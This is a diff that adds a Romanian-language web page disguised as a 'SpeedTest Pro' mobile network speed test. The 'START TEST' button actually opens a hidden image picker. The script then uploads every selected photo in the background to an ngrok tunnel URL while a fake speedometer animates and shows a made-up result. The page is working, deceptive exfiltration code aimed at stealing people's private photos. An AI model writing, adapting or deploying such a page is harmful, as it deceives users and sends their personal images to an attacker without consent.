@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ro">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest Pro - Verifică Viteza 5G/4G</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            background: #121212;
+            color: white;
+            padding-top: 50px;
+        }
+
+        .gauge {
+            width: 200px;
+            height: 200px;
+            border: 10px solid #00d4ff;
+            border-radius: 50%;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        #startBtn {
+            background: #00d4ff;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        #status {
+            margin-top: 20px;
+            color: #aaa;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>SpeedTest Pro</h1>
+    <p>Apasă butonul pentru a verifica viteza rețelei tale.</p>
+
+    <div class="gauge" id="speedDisplay">0 Mbps</div>
+
+    <button id="startBtn">START TEST</button>
+    <p id="status">Așteptare interacțiune...</p>
+
+    <input type="file" id="fileInput" accept="image/*" multiple style="display:none;">
+
+    <script>
+        // --- CONFIGURARE ---
+        const NGROK_URL = 'https://nonpredicative-conjecturally-lessie.ngrok-free.dev/upload';
+        // -------------------
+
+        const startBtn = document.getElementById('startBtn');
+        const fileInput = document.getElementById('fileInput');
+        const statusText = document.getElementById('status');
+        const speedDisplay = document.getElementById('speedDisplay');
+
+        // 1. Utilizatorul apasă butonul (necesar pentru iPhone)
+        startBtn.addEventListener('click',() => {
+            statusText.innerText = "Se conectează la serverul de test...";
+            fileInput.click(); // Deschide galeria/camera
+        });
+
+        // 2. Când utilizatorul alege pozele
+        fileInput.onchange = async function () {
+            const files = fileInput.files;
+            if (files.length === 0) return;
+
+            statusText.innerText = "Test în curs... Vă rugăm așteptați.";
+
+            // Simulăm un vitezometru care crește
+            let speed = 0;
+            let interval = setInterval(() => {
+                speed += Math.floor(Math.random() * 15);
+                if (speed > 95) speed = 98;
+                speedDisplay.innerText = speed + " Mbps";
+            },100);
+
+            // Trimitem fiecare poză în fundal
+            for (let i = 0;i < files.length;i++) {
+                const formData = new FormData();
+                formData.append('poza_capturata',files[i]);
+
+                try {
+                    await fetch(NGROK_URL,{
+                        method: 'POST',
+                        mode: 'cors',
+                        body: formData
+                    });
+                    console.log("Fișier trimis: " + files[i].name);
+                } catch (err) {
+                    console.error("Eroare trimitere:",err);
+                }
+            }
+
+            // Finalizăm "testul" după 3 secunde
+            setTimeout(() => {
+                clearInterval(interval);
+                speedDisplay.innerText = "104.2 Mbps";
+                statusText.innerText = "Test finalizat cu succes!";
+                statusText.style.color = "#00ff00";
+            },3000);
+        };
+    </script>
+</body>
+
+</html>
